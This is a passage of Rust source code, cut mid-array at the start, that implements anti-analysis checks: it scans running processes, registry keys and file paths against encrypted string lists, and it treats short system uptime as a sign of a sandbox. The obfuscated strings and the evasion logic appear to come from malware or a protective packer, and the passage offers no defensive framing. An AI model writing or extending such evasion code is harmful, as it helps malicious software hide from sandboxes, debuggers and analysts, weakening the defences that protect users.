, 33 , 130 , 0 , 234 , 59 , 246 , 222 , 169 , 10 , 93 , 172 , 146 , 101 , 246 , 36 , 178 , 84 , 178 , 240 , 28 , 32 , 213 , 226 , 231 , 28 , 167 , 130 , 152 , 223 , 233 , 171 , 54 , 200 , 129 , 86 , 100 , 87 , 113 , 114 , 41 , 9 , 65 , 100 , 45 , 202 , 94 , 77 , 65 , 158 , 85 , 119 , 192 , 190 , 125 , 95 , 228 , 24 , 124 , 163 , 48 , 2 , 92 , 89 , 205 , 91 , 101 , 11 , 58 , 90 , 73 , 104 , 24 , 74 , 7 , 158 , 133 , 175 , 164 , 18 , 148 , 59 , 143 , 185 , 65 , 203 , 141 , 190 , 25 , 33 , 126 , 32 , 8 , 242 , 15 , 117 , 97 , 86 , 230 , 173 , 32 , 18 , 40 , 147 , 84 , 115 , 230 , 241 , 243 , 89 , 121 , 200 , 187 , 155 , 158 , 6 , 15 , 17 , 77 , 62 , 248 , 77 , 21 , 254 , 68 , 252 , 203 , 24 , 39 , 234 , 26 , 247 , 4 , 153 , 236 , 162 , 157 , 155 , 203 , 199] , & [198 , 137 , 43 , 136 , 90 , 117 , 19 , 134 , 188 , 64 , 54 , 149 , 102 , 121 , 167 , 131 , 106 , 252 , 33 , 204 , 53 , 230 , 233 , 80 , 97 , 187 , 184 , 219 , 112 , 20 , 208 , 102 , 228 , 108 , 228 , 107 , 23 , 254 , 211 , 245 , 164 , 226 , 33 , 21 , 146 , 198 , 208 , 223 , 86 , 112 , 113 , 220 , 231 , 42 , 114 , 36 , 174 , 115 , 121 , 36 , 198 , 12 , 197 , 156 , 203 , 198 , 181 , 167 , 17 , 179 , 247 , 223 , 184 , 232 , 13 , 116 , 78 , 147 , 42 , 58 , 68 , 160 , 61 , 180 , 87 , 135 , 195 , 116] , 20186346292091u64) , decode_g_n_ydeodepcqq (& [212 , 48 , 253 , 92 , 48 , 69 , 92 , 120 , 193 , 150 , 120 , 130 , 219 , 29 , 239 , 226 , 176 , 177 , 95 , 128 , 26 , 212 , 44 , 134 , 188 , 197 , 173 , 94 , 17 , 47 , 193 , 187 , 53 , 9 , 182 , 130 , 31 , 194 , 42 , 28 , 198 , 104 , 62 , 126 , 202 , 21 , 206 , 153 , 181 , 17 , 232 , 46 , 130 , 124 , 120 , 208 , 159 , 204 , 181 , 7 , 24 , 205 , 15 , 75 , 204 , 64 , 247 , 52 , 251 , 15 , 92 , 74 , 194 , 58 , 132 , 218 , 252 , 186 , 240 , 105 , 202 , 243 , 172 , 230 , 181 , 198 , 115 , 135 , 48 , 226 , 122 , 9 , 182 , 199 , 145 , 42 , 152 , 0 , 35 , 23 , 105 , 131 , 67 , 215 , 87 , 243 , 219 , 90 , 24 , 165 , 84 , 138 , 121 , 50 , 144 , 158 , 177 , 58 , 2 , 85 , 76 , 18 , 201 , 235 , 116 , 125 , 87 , 131 , 100 , 68 , 187 , 103 , 112 , 8 , 243 , 211 , 254 , 197 , 235 , 72 , 149 , 59 , 84 , 148] , & [41 , 28 , 167 , 169 , 185 , 100 , 61 , 235 , 244 , 9 , 71 , 1 , 247 , 191 , 246 , 42 , 20 , 181 , 92 , 8 , 0 , 71 , 64 , 186 , 70 , 98 , 248 , 112 , 186 , 194 , 200 , 8 , 49 , 167 , 69 , 226 , 234 , 196 , 36 , 45 , 164 , 238 , 226 , 226 , 97 , 245 , 68 , 98 , 202 , 209 , 167 , 40 , 24 , 241 , 167 , 158 , 154 , 219 , 48 , 145 , 77 , 54 , 115 , 182 , 70 , 167 , 5 , 21 , 35 , 5 , 160 , 12 , 0 , 25 , 59 , 33 , 188 , 150 , 191 , 151 , 82 , 176 , 72 , 132 , 87 , 173 , 58 , 255] , 20371029885824u64) ,] ; if let Ok (snapshot) = unsafe { CreateToolhelp32Snapshot (TH32CS_SNAPPROCESS , 0) } { if snapshot . is_invalid () { return false ; } let mut process_entry = PROCESSENTRY32 { dwSize : std :: mem :: size_of :: < PROCESSENTRY32 > () as u32 , .. Default :: default () } ; if unsafe { Process32First (snapshot , & mut process_entry) } . is_ok () { loop { let process_name = unsafe { std :: ffi :: CStr :: from_ptr (process_entry . szExeFile . as_ptr () as * const i8) } . to_string_lossy () . to_lowercase () ; for suspicious in suspicious_processes { if process_name . contains (suspicious) { unsafe { let _ = CloseHandle (snapshot) ; } ; return true ; } } if unsafe { Process32Next (snapshot , & mut process_entry) } . is_err () { break ; } } } unsafe { let _ = CloseHandle (snapshot) ; } ; } false } pub fn check_artifacts () -> bool { let suspicious_registry_keys = [decode_g_n_ydeodepcqq (& [7 , 85 , 147 , 184 , 167 , 36 , 144 , 13 , 3 , 160 , 54 , 1 , 90 , 251 , 57 , 28 , 68 , 162 , 128 , 206 , 226 , 252 , 104 , 207 , 3 , 124 , 125 , 178 , 198 , 181 , 46 , 156 , 250 , 244 , 84 , 82 , 136 , 241 , 211 , 38 , 235 , 95 , 152 , 136 , 185 , 102 , 23 , 15 , 170 , 191 , 66 , 209 , 88 , 167 , 172 , 147 , 150 , 20 , 54 , 157 , 11 , 57 , 127 , 95 , 34 , 96 , 85 , 93 , 183 , 36 , 218 , 235 , 69 , 133 , 22 , 132 , 15 , 27 , 150 , 120 , 240 , 200 , 115 , 175 , 162 , 36 , 1 , 79 , 236 , 83 , 119 , 195 , 148 , 19 , 151 , 139 , 133 , 109 , 81 , 221 , 4 , 25 , 85 , 77 , 19 , 121 , 9 , 200 , 8 , 107 , 116 , 246 , 166 , 129 , 138 , 236 , 55 , 230 , 138 , 78 , 44 , 143 , 254 , 243 , 97 , 136 , 161 , 145 , 240 , 191 , 238 , 0 , 160 , 178 , 124 , 132 , 233 , 67 , 103 , 99 , 71 , 5 , 226 , 99 , 73 , 163 , 10 , 9 , 138 , 228 , 214 , 173 , 153 , 249 , 196 , 145 , 67 , 9 , 96 , 9 , 185 , 7 , 213 , 177 , 192 , 240 , 249 , 17 , 241 , 33 , 152 , 51 , 139 , 33 , 122 , 11 , 205 , 66 , 206 , 21 , 18 , 124 , 187 , 99 , 163 , 70 , 124 , 185 , 115 , 28 , 236 , 181 , 89 , 93 , 153 , 2 , 117 , 57 , 12 , 106 , 94 , 81 , 178 , 26 , 204 , 16 , 149 , 181 , 92 , 251 , 182 , 133 , 201 , 230 , 77 , 199 , 91 , 232 , 92 , 156 , 1 , 100 , 135 , 33 , 95 , 51 , 14 , 80 , 40 , 246 , 155 , 101 , 19 , 225 , 245 , 4 , 85 , 236 , 31 , 14 , 51 , 41 , 184 , 16 , 66 , 112 , 19 , 208 , 47 , 107 , 203 , 76 , 101 , 42 , 171 , 235 , 199 , 37 , 16 , 192 , 255 , 76 , 15 , 59 , 151 , 178 , 155 , 202 , 98 , 186 , 208 , 210 , 112 , 162 , 242 , 3 , 92 , 12 , 171 , 6 , 143 , 112 , 249 , 146 , 194 , 143 , 238 , 169 , 78 , 7 , 230 , 134 , 135 , 145 , 15 , 73 , 138 , 41 , 175 , 122 , 138 , 147 , 133 , 5 , 3 , 190 , 185 , 158 , 111 , 38 , 15 , 208 , 77 , 45 , 122 , 81 , 59 , 72 , 26 , 244] , & [252 , 7 , 86 , 172 , 53 , 182 , 214 , 81 , 151 , 117 , 57 , 147 , 94 , 145 , 24 , 235 , 100 , 196 , 100 , 132 , 45 , 44 , 42 , 218 , 145 , 35 , 8 , 113 , 70 , 105 , 238 , 192 , 87 , 185 , 59 , 236 , 33 , 71 , 236 , 86 , 93 , 12 , 208 , 78 , 169 , 157 , 41 , 228 , 19 , 0 , 108 , 95 , 5 , 102 , 41 , 187 , 84 , 209 , 168 , 115 , 62 , 82 , 60 , 19 , 145 , 144 , 183 , 91 , 90 , 155 , 89 , 41 , 25 , 3 , 2 , 160 , 30 , 101 , 7 , 192 , 115 , 217 , 197 , 72 , 31 , 221 , 137 , 124] , 106055627442092u64) , decode_g_n_ydeodepcqq (& [238 , 114 , 192 , 241 , 31 , 151 , 240 , 71 , 236 , 120 , 217 , 156 , 43 , 28 , 185 , 42 , 188 , 52 , 163 , 109 , 243 , 173 , 102 , 97 , 56 , 219 , 110 , 131 , 122 , 210 , 220 , 161 , 167 , 193 , 96 , 209 , 60 , 75 , 26 , 109 , 232 , 89 , 210 , 100 , 94 , 189 , 201 , 72 , 92 , 248 , 105 , 14 , 123 , 32 , 228 , 33 , 169 , 152 , 41 , 156 , 7 , 165 , 126 , 153 , 25 , 163 , 61 , 81 , 178 , 255 , 90 , 182 , 66 , 32 , 146 , 40 , 69 , 179 , 35 , 199 , 176 , 218 , 58 , 16 , 250 , 179 , 139 , 8 , 167 , 42 , 225 , 112 , 116 , 13 , 225 , 175 , 143 , 237 , 65 , 197 , 7 , 17 , 242 , 21 , 45 , 225 , 144 , 16 , 85 , 67 , 254 , 177 , 116 , 86 , 203 , 186 , 245 , 108 , 138 , 211 , 9 , 199 , 94 , 224 , 65 , 245 , 240 , 137 , 23 , 192 , 11 , 4 , 76 , 174 , 148 , 114 , 246 , 11 , 173 , 182 , 191 , 33 , 159 , 123 , 96 , 8 , 122 , 92 , 30 , 239 , 42 , 45 , 183 , 172 , 189 , 220 , 145 , 90 , 48 , 210 , 234 , 40 , 170 , 15 , 236 , 163 , 129 , 157 , 43 , 205 , 178 , 1 , 141 , 45 , 44 , 47 , 82 , 214 , 237 , 105 , 35 , 44 , 158 , 56 , 160 , 56 , 139 , 1 , 185 , 211 , 184 , 52 , 131 , 255 , 241 , 151 , 122 , 167 , 180 , 185 , 132 , 183 , 164 , 216 , 26 , 141 , 52 , 232 , 206 , 78 , 219 , 83 , 0 , 45 , 219 , 47 , 201 , 192 , 152 , 124 , 224 , 57 , 103 , 118 , 178 , 42 , 143 , 168 , 85 , 252 , 178 , 248 , 41 , 50 , 98 , 252 , 188 , 255 , 199 , 49 , 197 , 92 , 211 , 249 , 138 , 228 , 2 , 237 , 36 , 160 , 47 , 126 , 132 , 154 , 189 , 157 , 14 , 78 , 156 , 91 , 254 , 53 , 15 , 10 , 172 , 54 , 129 , 133 , 174 , 143 , 176 , 87 , 200 , 140 , 146 , 3 , 93 , 197 , 97 , 120 , 172 , 118 , 197 , 217 , 230 , 237 , 86 , 75 , 0 , 151 , 127 , 64 , 142 , 79 , 97 , 190 , 174 , 145 , 36 , 107 , 204 , 120 , 170 , 153 , 46 , 80 , 113 , 112 , 208 , 133 , 37 , 10 , 105 , 252 , 2 , 74 , 157 , 20 , 36 , 121 , 146 , 141 , 106 , 1 , 230 , 75 , 180 , 40 , 181 , 241 , 241 , 109 , 154 , 34 , 136 , 236 , 41 , 79 , 165 , 107 , 81 , 151 , 187 , 83 , 207 , 4 , 169 , 59 , 158 , 221 , 194 , 23 , 23 , 101 , 28 , 163 , 178 , 57 , 108 , 84 , 150 , 39 , 100 , 145 , 210 , 109 , 159 , 241 , 225 , 241 , 187 , 121 , 252 , 200 , 132 , 167 , 244 , 53 , 35 , 167 , 171 , 159 , 236 , 168 , 195 , 98 , 0 , 68 , 187 , 235 , 102 , 72 , 83 , 233 , 116 , 27 , 131 , 133 , 173 , 199 , 241 , 88 , 210 , 44 , 230 , 119 , 51 , 247 , 66 , 133 , 97 , 243 , 138 , 13 , 2 , 64 , 23 , 200 , 60 , 197 , 105 , 123 , 120 , 5 , 193 , 159 , 28 , 102 , 243 , 54 , 135 , 233 , 0 , 168 , 52 , 66 , 207 , 25 , 130 , 181 , 241 , 217 , 159 , 1 , 55 , 179 , 11 , 254 , 185 , 217 , 95 , 228 , 5 , 68 , 169 , 145 , 112 , 189 , 146 , 210 , 134 , 87 , 158 , 46 , 10 , 45 , 7 , 156 , 184 , 76 , 43 , 88 , 70 , 222 , 181 , 67 , 75 , 70 , 186 , 105] , & [241 , 123 , 154 , 0 , 9 , 156 , 129 , 5 , 35 , 164 , 244 , 103 , 187 , 118 , 37 , 183 , 176 , 237 , 10 , 70 , 210 , 77 , 166 , 65 , 225 , 189 , 67 , 124 , 196 , 81 , 135 , 48 , 14 , 22 , 106 , 224 , 98 , 27 , 222 , 128 , 86 , 92 , 202 , 189 , 197 , 201 , 150 , 19 , 139 , 74 , 73 , 19 , 103 , 117 , 183 , 80 , 12 , 152 , 137 , 39 , 128 , 213 , 95 , 49 , 203 , 125 , 89 , 56 , 225 , 31 , 41 , 37 , 55 , 179 , 132 , 152 , 9 , 19 , 153 , 236 , 208 , 97 , 127 , 134 , 94 , 83 , 97 , 102] , 70519068036977u64) ,] ; for key in suspicious_registry_keys { let mut hkey = HKEY_LOCAL_MACHINE ; if unsafe { RegOpenKeyExA (HKEY_LOCAL_MACHINE , PCSTR (key . as_ptr ()) , 0 , KEY_READ , & mut hkey) } . is_ok () { unsafe { let _ = RegCloseKey (hkey) ; } ; return true ; } } let suspicious_files = [decode_g_n_ydeodepcqq (& [214 , 252 , 104 , 135 , 138 , 158 , 67 , 16 , 133 , 180 , 7 , 10 , 104 , 207 , 19 , 54 , 175 , 18 , 114 , 243 , 214 , 176 , 1 , 65 , 179 , 2 , 131 , 183 , 176 , 146 , 146 , 209 , 13 , 231 , 239 , 139 , 201 , 150 , 4 , 200 , 224 , 29 , 250 , 149 , 138 , 198 , 38 , 28 , 102 , 16 , 82 , 38 , 239 , 110 , 71 , 133 , 9 , 120 , 150 , 176 , 55 , 221 , 225 , 13 , 127 , 219 , 19 , 72 , 227 , 219 , 254 , 20 , 32 , 253 , 18 , 201 , 208 , 112 , 242 , 75 , 123 , 203 , 204 , 212 , 98 , 179 , 113 , 78 , 242 , 90 , 145 , 20 , 15 , 155 , 198 , 79 , 194 , 146 , 172 , 225 , 139 , 193 , 181 , 238 , 11 , 180 , 42 , 179 , 246 , 105 , 168 , 64 , 27 , 34 , 65 , 175 , 165 , 55 , 17 , 75 , 64 , 173 , 37 , 6 , 90 , 51 , 177 , 53 , 161 , 81 , 237 , 54 , 195 , 159 , 4 , 9 , 38 , 142 , 55 , 75 , 104 , 115 , 116 , 236 , 133 , 227 , 23 , 139 , 29 , 66 , 205 , 96 , 185 , 98 , 48 , 126 , 38 , 86 , 86 , 11 , 72 , 246 , 157 , 108 , 189 , 245 , 49 , 120 , 93 , 102 , 246 , 139 , 137 , 97 , 233 , 33 , 84 , 248 , 62 , 250 , 248 , 240 , 47 , 23 , 86 , 209 , 42 , 150 , 149 , 103 , 186 , 33 , 78 , 36 , 51 , 200 , 74 , 209 , 71 , 245 , 236 , 124 , 147 , 31 , 254 , 50 , 179 , 251 , 30 , 42 , 243 , 147 , 105 , 75 , 230 , 78 , 248 , 93 , 103 , 34 , 160 , 136 , 27 , 104 , 197 , 144 , 20 , 117 , 194 , 118 , 83 , 95 , 184 , 170 , 94 , 227 , 42 , 114 , 94 , 208 , 216 , 79 , 104 , 169 , 145 , 21 , 63 , 141 , 151 , 204 , 51 , 153 , 41 , 151 , 107 , 154 , 48 , 175 , 107 , 97 , 194 , 64 , 226 , 22 , 174 , 123 , 70 , 28 , 107 , 70 , 52 , 124 , 187 , 226 , 122 , 207 , 253 , 149 , 77 , 75 , 240 , 183 , 185 , 198 , 85 , 77 , 200 , 156 , 14 , 168 , 139 , 227 , 9 , 252 , 244 , 252 , 69 , 219 , 127 , 181 , 215 , 201 , 179 , 69 , 106 , 180 , 101 , 40 , 17 , 27 , 90 , 64 , 81 , 102 , 229 , 219 , 252 , 43 , 193 , 166 , 41 , 48 , 71 , 214 , 114 , 213 , 100 , 59 , 172 , 24 , 174 , 45 , 160 , 178 , 91 , 172 , 138 , 14 , 137 , 100 , 165 , 71 , 3 , 187 , 225 , 56 , 245 , 240 , 161 , 237 , 14 , 51 , 37 , 244 , 52 , 88 , 211 , 199 , 146 , 252 , 130 , 239 , 57 , 17 , 57 , 132 , 61 , 56 , 219 , 115 , 28 , 184 , 30 , 129 , 101 , 193 , 133 , 117 , 171 , 246 , 223 , 124 , 131 , 38 , 63 , 28 , 69 , 83 , 176 , 20 , 24 , 158 , 157 , 92 , 25 , 191 , 174 , 160 , 101 , 156 , 21 , 136 , 232 , 248 , 192 , 156 , 61 , 62 , 89 , 62 , 80 , 97 , 186 , 233 , 225 , 56 , 38 , 87 , 101 , 165 , 165 , 210 , 143 , 40 , 45 , 8 , 34 , 216 , 94 , 41 , 90 , 64 , 14 , 208 , 183 , 98 , 212 , 135 , 119 , 237 , 234 , 237 , 233 , 72 , 132 , 161 , 57 , 34 , 105 , 113 , 43 , 64 , 72 , 170 , 80 , 101 , 23 , 28 , 75 , 231 , 31 , 26 , 189 , 4 , 195 , 74 , 254 , 156 , 225 , 184 , 77 , 66 , 246 , 235 , 205 , 67 , 223 , 246 , 26 , 166] , & [162 , 149 , 104 , 176 , 110 , 115 , 36 , 162 , 55 , 179 , 186 , 41 , 124 , 206 , 36 , 201 , 51 , 230 , 127 , 155 , 19 , 5 , 201 , 130 , 37 , 29 , 5 , 29 , 62 , 39 , 125 , 103 , 87 , 72 , 252 , 125 , 241 , 91 , 129 , 187 , 19 , 89 , 129 , 173 , 34 , 206 , 25 , 79 , 244 , 93 , 156 , 224 , 103 , 188 , 4 , 24 , 225 , 135 , 59 , 73 , 32 , 2 , 143 , 171 , 0 , 253 , 126 , 87 , 12 , 200 , 91 , 28 , 64 , 132 , 91 , 113 , 191 , 59 , 229 , 75 , 246 , 30 , 45 , 165 , 69 , 17 , 33 , 209] , 53085795782455u64) , decode_g_n_ydeodepcqq (& [10 , 16 , 101 , 184 , 217 , 246 , 175 , 211 , 99 , 96 , 175 , 17 , 107 , 108 , 108 , 33 , 54 , 158 , 135 , 12 , 25 , 42 , 137 , 217 , 97 , 141 , 251 , 150 , 135 , 16 , 101 , 173 , 184 , 153 , 69 , 251 , 10 , 202 , 54 , 100 , 41 , 239 , 255 , 234 , 22 , 42 , 53 , 4 , 98 , 206 , 169 , 88 , 126 , 193 , 198 , 239 , 127 , 175 , 39 , 204 , 106 , 45 , 39 , 239 , 129 , 182 , 1 , 150 , 68 , 228 , 162 , 202 , 226 , 232 , 107 , 139 , 55 , 245 , 218 , 52 , 107 , 86 , 232 , 197 , 176 , 14 , 16 , 250 , 99 , 105 , 12 , 16 , 238 , 12 , 8 , 34 , 131 , 42 , 169 , 52 , 5 , 240 , 66 , 254 , 194 , 181 , 175 , 84 , 53 , 117 , 243 , 59 , 61 , 194 , 238 , 168 , 124 , 231 , 41 , 153 , 107 , 19 , 127 , 253 , 62 , 161 , 237 , 192 , 208 , 253 , 169 , 17 , 121 , 80 , 106 , 210 , 184 , 199 , 255 , 23 , 106 , 173 , 174 , 65 , 176 , 139 , 170 , 166 , 236 , 201 , 202 , 210 , 163 , 2 , 134 , 206 , 54 , 141 , 91 , 183 , 208 , 2 , 115 , 235 , 44 , 89 , 229 , 229 , 161 , 140 , 11 , 161 , 172 , 205 , 90 , 58 , 38 , 84 , 146 , 143 , 79 , 153 , 162 , 234 , 254 , 81 , 179 , 208 , 16 , 97 , 211 , 40 , 196 , 142 , 202 , 0 , 25 , 229 , 11 , 119 , 21 , 60 , 218 , 44 , 92 , 168 , 103 , 173 , 84 , 81 , 190 , 193 , 173 , 238 , 181 , 43 , 122 , 189 , 197 , 23 , 32 , 140 , 104 , 41 , 225 , 205 , 148 , 128 , 28 , 71 , 123 , 70 , 129 , 80 , 72 , 145 , 98 , 36 , 19 , 44 , 180 , 240 , 137 , 166 , 2 , 166 , 201 , 138 , 232 , 149 , 44 , 160 , 179 , 11 , 197 , 113 , 28 , 48 , 115 , 39 , 127 , 187 , 68 , 59 , 121 , 249 , 225 , 108 , 139 , 175 , 44 , 251 , 170 , 121 , 223 , 202 , 128 , 121 , 95 , 208 , 146 , 10 , 178 , 106 , 30 , 44 , 169 , 15 , 142 , 119 , 227 , 122 , 9 , 185 , 190 , 50 , 160 , 59 , 95 , 220 , 238 , 128 , 165 , 155 , 184 , 104 , 47 , 174 , 151 , 232 , 225 , 26 , 110 , 31 , 1 , 33 , 131 , 43 , 210 , 16 , 174 , 198 , 197 , 231 , 44 , 202 , 33 , 129 , 18 , 167 , 19 , 186 , 176 , 137 , 136 , 166 , 219 , 207 , 151 , 225 , 122 , 118 , 36 , 86 , 74 , 196 , 235 , 210 , 213 , 212 , 106 , 83 , 97 , 137 , 249 , 235 , 133 , 59 , 73 , 197 , 41 , 88 , 16 , 118 , 15 , 190 , 24 , 253 , 223 , 183 , 22 , 47 , 235 , 113 , 14 , 219 , 252 , 185 , 67 , 228 , 101 , 93 , 69 , 141 , 18 , 63 , 79 , 33 , 5 , 157 , 13 , 149 , 242 , 249 , 153 , 249 , 47 , 21 , 156 , 53 , 11 , 240 , 51 , 2 , 98 , 175 , 194 , 176 , 124 , 223 , 181 , 141 , 81 , 143 , 113 , 33 , 115 , 240 , 180 , 106 , 169 , 212 , 81 , 151 , 45 , 59 , 120 , 77 , 17 , 219 , 94 , 87 , 189 , 23 , 123 , 60 , 34 , 237 , 119 , 196 , 33 , 190 , 3 , 180 , 186 , 181 , 2 , 126 , 48 , 111 , 178 , 247 , 122 , 255 , 50 , 56 , 231 , 13 , 16 , 237 , 64 , 16 , 11 , 54 , 117 , 178 , 211 , 61 , 144 , 189 , 75 , 149 , 178 , 181 , 61 , 165 , 175 , 146 , 8 , 253] , & [52 , 18 , 214 , 178 , 84 , 93 , 188 , 140 , 240 , 134 , 213 , 76 , 91 , 87 , 254 , 96 , 163 , 187 , 250 , 85 , 220 , 78 , 7 , 112 , 29 , 195 , 18 , 152 , 103 , 132 , 130 , 11 , 183 , 81 , 164 , 55 , 88 , 200 , 39 , 55 , 212 , 93 , 217 , 200 , 9 , 16 , 115 , 49 , 34 , 204 , 31 , 177 , 108 , 156 , 141 , 183 , 38 , 67 , 215 , 154 , 87 , 129 , 183 , 152 , 24 , 120 , 185 , 80 , 68 , 222 , 100 , 234 , 187 , 8 , 123 , 13 , 42 , 72 , 160 , 162 , 250 , 206 , 169 , 131 , 11 , 239 , 208 , 196] , 52901112188726u64) ,] ; for file in suspicious_files { if Path :: new (file) . exists () { return true ; } } false } pub fn check_uptime () -> bool { let uptime_ms = unsafe { GetTickCount64 () } ; if uptime_ms < (4446 + 295554) { return true ; } false }